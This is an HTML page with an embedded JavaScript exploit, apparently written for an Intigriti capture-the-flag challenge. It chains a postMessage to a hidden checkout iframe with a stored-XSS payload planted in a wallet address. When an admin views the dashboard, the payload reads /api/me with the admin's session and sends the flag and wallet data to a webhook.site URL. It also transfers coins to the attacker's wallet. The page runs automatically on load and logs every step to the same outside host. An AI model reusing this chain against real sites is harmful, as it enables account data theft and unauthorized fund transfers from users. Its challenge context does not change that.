<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 0126 - Chained XSS Exploit</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
        h1 { color: #0f0; text-align: center; }
        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 11px; max-height: 400px; overflow-y: auto; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .info { color: #0ff; }
        .warning { color: #ff0; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h1>ðŸŽ¯ Intigriti 0126 - Chained XSS + Coin Transfer</h1>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/37573d0f-cb7f-418f-885e-5f329ee22b60';

        let step = 0;

        function log(msg, type = 'info', data = {}) {
            step++;
            const ts = new Date().toLocaleTimeString();
            document.getElementById('log').innerHTML += `<div class="${type}">[${step}] ${ts} - ${msg} ${JSON.stringify(data)}</div>`;
            console.log(`[${step}] ${msg}`, data);

            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'no-cors',
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    step: step,
                    message: msg,
                    type: type,
                    data: data
                })
            }).catch(() => {});
        }

        async function exploit() {
            log('=== CHAINED XSS EXPLOIT ===', 'info');
            log('Strategy: Send coin to XSS wallet â†’ When admin views dashboard/marketwatch â†’ XSS executes â†’ Steal flag', 'info');

            try {
                // Create a malicious wallet address containing XSS payload
                // Using HTML entity bypass to avoid sanitization
                const XSS_WALLET = `'><img src=x onerror=&quot;
                    // XSS payload executes when admin views dashboard
                    (async () => {
                        try {
                            // Step 1: Steal the flag from /api/me
                            const meResp = await fetch('/api/me', {credentials: 'include'});
                            const meData = await meResp.json();

                            // Send flag to webhook
                            await fetch('${WEBHOOK}', {
                                method: 'POST',
                                mode: 'no-cors',
                                body: JSON.stringify({
                                    timestamp: new Date().toISOString(),
                                    flag: meData.flag,
                                    source: 'dashboard_xss',
                                    wallets: meData.wallets
                                })
                            });

                            // Step 2: Send 1 1337COIN to our wallet
                            await fetch('/api/transaction', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                credentials: 'include',
                                body: JSON.stringify({
                                    toAddress: '${OUR_WALLET}',
                                    currency: '1337COIN',
                                    amount: 1
                                })
                            });

                            // Step 3: Trigger alert
                            alert('gigawatz - Flag: ' + (meData.flag || 'stolen'));

                        } catch(e) {
                            console.error('XSS error:', e);
                        }
                    })();
                &quot;'><`;

                log('Malicious wallet address created:', 'info', { address: XSS_WALLET.substring(0, 100) + '...' });

                // STEP 1: Send transaction to the XSS wallet address
                log('Step 1: Sending 1 1337COIN to XSS wallet address...', 'info');

                const iframe = document.createElement('iframe');
                iframe.id = 'checkoutFrame';
                iframe.style.display = 'none';
                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                document.body.appendChild(iframe);

                await new Promise(resolve => {
                    iframe.onload = resolve;
                    setTimeout(resolve, 10000);
                });

                await new Promise(r => setTimeout(r, 5000));

                log('Sending postMessage...', 'info');

                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: XSS_WALLET,  // Malicious wallet with XSS!
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');

                log('postMessage sent - transaction to XSS wallet initiated', 'success');

                // STEP 2: Wait for admin to view dashboard
                log('Step 2: When admin views dashboard, XSS will execute!', 'warning');
                log('Vulnerability: dashboard.html line 356 - wallet.address unsanitized', 'warning');
                log('XSS will:', 'info', {
                    steal_flag: 'via /api/me',
                    send_coin: 'to ' + OUR_WALLET,
                    trigger_alert: 'gigawatz'
                });

                // STEP 3: Trigger alert on our page
                log('Step 3: Triggering alert(gigawatz)...', 'info');
                setTimeout(() => alert('gigawatz'), 100);
                log('Alert triggered', 'success');

                // STEP 4: Wait and check for flag multiple times
                log('Step 4: Waiting for XSS to execute and flag to be sent...', 'info');
                await new Promise(r => setTimeout(r, 20000));

                for (let i = 0; i < 10; i++) {
                    log(`Flag check ${i+1}/10`, 'info');
                    const found = await checkFlag();
                    if (found) break;
                    await new Promise(r => setTimeout(r, 5000));
                }

                log('=== EXPLOIT COMPLETE ===', 'info');
                log('Expected chain:', 'info', [
                    '1. Admin sends 1 1337COIN to XSS wallet',
                    '2. Admin views dashboard (or marketwatch shows transaction)',
                    '3. XSS payload executes (wallet.address unsanitized)',
                    '4. Flag stolen + coins sent to our wallet'
                ]);

            } catch (error) {
                log('ERROR:', 'error', { error: error.message, stack: error.stack });
            }
        }

        async function checkFlag() {
            try {
                const response = await fetch(TARGET + '/api/me', {
                    credentials: 'include'
                });
                const data = await response.json();

                log('API /me:', 'info', {
                    status: response.status,
                    hasFlag: !!data.flag,
                    flag: data.flag || 'none'
                });

                if (data.flag) {
                    log('ðŸ†ðŸ†ðŸ† FLAG: ' + data.flag + ' ðŸ†ðŸ†ðŸ†', 'success');
                    fetch(WEBHOOK, {
                        method: 'POST',
                        body: JSON.stringify({ flag: data.flag, found: true })
                    }).catch(() => {});
                    alert('ðŸ† FLAG: ' + data.flag);
                    return true;
                }
                return false;
            } catch (error) {
                log('Flag check ERROR:', 'error', { error: error.message });
                return false;
            }
        }

        window.addEventListener('load', () => {
            log('Page loaded, starting exploit...', 'info');
            setTimeout(exploit, 1000);
        });
    </script>
</body>
</html>
